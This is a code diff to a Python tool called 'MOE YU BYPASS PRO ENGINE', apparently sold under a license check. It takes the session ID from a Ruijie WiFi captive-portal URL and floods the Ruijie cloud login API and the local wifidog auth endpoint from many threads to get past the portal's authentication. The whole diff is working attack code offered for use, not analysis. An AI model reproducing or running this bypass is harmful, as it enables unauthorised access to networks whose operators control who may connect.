@@ -34,7 +34,7 @@ RESET = "\033[0m"
 # License Database URL
 URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 
-# အသစ်ပြင်ဆင်ထားသော LOGO
+# ပြင်ဆင်ထားသော LOGO
 GREETING_LOGO = """
 [bold cyan]
       _      
@@ -79,7 +79,7 @@ def display_header():
     console.clear()
     console.print(Align.center(GREETING_LOGO))
     console.print(Align.center(BANNER))
-    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.5 (IP AUTO-DETECT)[/bold cyan]\n"))
+    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.6 (HYBRID CLOUD)[/bold cyan]\n"))
 
 def check_license():
     my_hwid = get_hwid()
@@ -111,74 +111,82 @@ def check_license():
         sys.exit()
 
 # ===============================
-# BYPASS ENGINE (IP DYNAMIC FIX)
+# BYPASS CORE LOGIC
 # ===============================
-def start_bypass_process():
-    while not stop_event.is_set():
+def bypass_engine(sid, res_val, gw_ip="192.168.110.1"):
+    cloud_auth = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res_val}"
+    local_auth = f"http://{gw_ip}:2060/wifidog/auth?token={sid}"
+    
+    console.print(f"\n[bold yellow]⚙️ BYPASSING... (SID: {sid[:10]})[/bold yellow]")
+
+    def pulse_ping():
+        session = requests.Session()
+        session.verify = False
+        while not stop_event.is_set():
+            try:
+                session.get(cloud_auth, timeout=10)
+                session.get(local_auth, timeout=10)
+                sys.stdout.write(f"{GREEN}[✓] BYPASS ACTIVE{RESET}\n")
+                sys.stdout.flush()
+            except: pass
+            time.sleep(0.4)
+
+    for _ in range(PING_THREADS):
+        threading.Thread(target=pulse_ping, daemon=True).start()
+
+    while True:
         try:
-            session = requests.Session()
-            session.verify = False
-            session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'})
+            if requests.get("http://www.google.com", timeout=5).status_code == 200:
+                sys.stdout.write(f"{CYAN}[!] INTERNET SUCCESSFUL 🔥{RESET}\n")
+                time.sleep(20)
+            else: break
+        except: break
 
-            # Step 1: Portal Detection & IP Auto-Detect
-            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
-            
-            if r.status_code == 204:
-                sys.stdout.write(f"{CYAN}[!] Internet is already connected...{RESET}\n")
-                time.sleep(10)
-                continue
-            
-            portal_url = r.url
-            parsed_url = urlparse(portal_url)
-            p = parse_qs(parsed_url.query)
-            
-            # IP Address ကို URL ထဲကနေ Auto ရှာဖွေခြင်း
-            gw_addr = p.get('gw_address', [parsed_url.netloc.split(':')[0]])[0]
-            gw_port = p.get('gw_port', ['2060'])[0]
-            sid = p.get('sessionId', [None])[0]
-            res_val = p.get('RES', [''])[0]
+def start_bypass_process():
+    display_header()
+    console.print("[1] Auto Detect (WiFi Gateway)")
+    console.print("[2] Manual URL (Paste Link from Browser)")
+    mode = input("\nSelect Mode [1/2]: ").strip()
 
+    if mode == "2":
+        manual_url = input("\nPaste the Portal URL here: ").strip()
+        try:
+            parsed = urlparse(manual_url)
+            params = parse_qs(parsed.query)
+            sid = params.get('sessionId', [None])[0]
+            res = params.get('RES', [''])[0]
+            gw = params.get('gw_address', [parsed.netloc.split(':')[0]])[0]
+            
             if sid:
-                # Cloud MACC API & Local Auth Paths
-                cloud_auth = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res_val}"
-                local_auth = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
-                
-                console.print(f"[bold yellow]⚙️ BYPASSING IP: {gw_addr} | SID: {sid[:10]}[/bold yellow]")
-
-                def pulse_ping():
-                    while not stop_event.is_set():
-                        try:
-                            # Server နှစ်ခုလုံးဆီ Request ပို့ပြီး bypass လုပ်ခြင်း
-                            session.get(cloud_auth, timeout=10)
-                            session.get(local_auth, timeout=10)
-                            sys.stdout.write(f"{GREEN}[✓] BYPASS ACTIVE | SESSION: {sid[:8]}{RESET}\n")
-                            sys.stdout.flush()
-                        except: pass
-                        time.sleep(0.4)
-
-                for _ in range(PING_THREADS):
-                    threading.Thread(target=pulse_ping, daemon=True).start()
-                
-                # Connection Check
-                while True:
-                    try:
-                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
-                            sys.stdout.write(f"{GREEN}[!] SUCCESS: BYPASS WORKING 🔥{RESET}\n")
-                            time.sleep(20)
-                        else: break
-                    except: break
+                bypass_engine(sid, res, gw)
             else:
-                sys.stdout.write(f"{YELLOW}[?] Waiting for Session ID (Please open Login Page in Browser)...{RESET}\n")
+                console.print("[bold red]Error: sessionId not found in link![/bold red]")
+        except Exception as e:
+            console.print(f"[bold red]Error parsing URL: {e}[/bold red]")
+    else:
+        # Auto-detect Mode
+        while not stop_event.is_set():
+            try:
+                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
+                if r.status_code == 204:
+                    sys.stdout.write(f"{CYAN}[!] Internet is already connected...{RESET}\n")
+                    time.sleep(10)
+                    continue
+                
+                p = parse_qs(urlparse(r.url).query)
+                sid = p.get('sessionId', [None])[0]
+                if sid:
+                    bypass_engine(sid, p.get('RES',[''])[0])
+                    break
+                else:
+                    sys.stdout.write(f"{YELLOW}[?] Waiting for Session ID... (Open browser first){RESET}\n")
+                    time.sleep(5)
+            except:
                 time.sleep(5)
-
-        except:
-            time.sleep(5)
 
 if __name__ == "__main__":
     try:
         if check_license():
-            console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
             start_bypass_process()
     except KeyboardInterrupt:
-        console.print("\n[bold red]Exiting...[/bold red]")
         sys.exit()
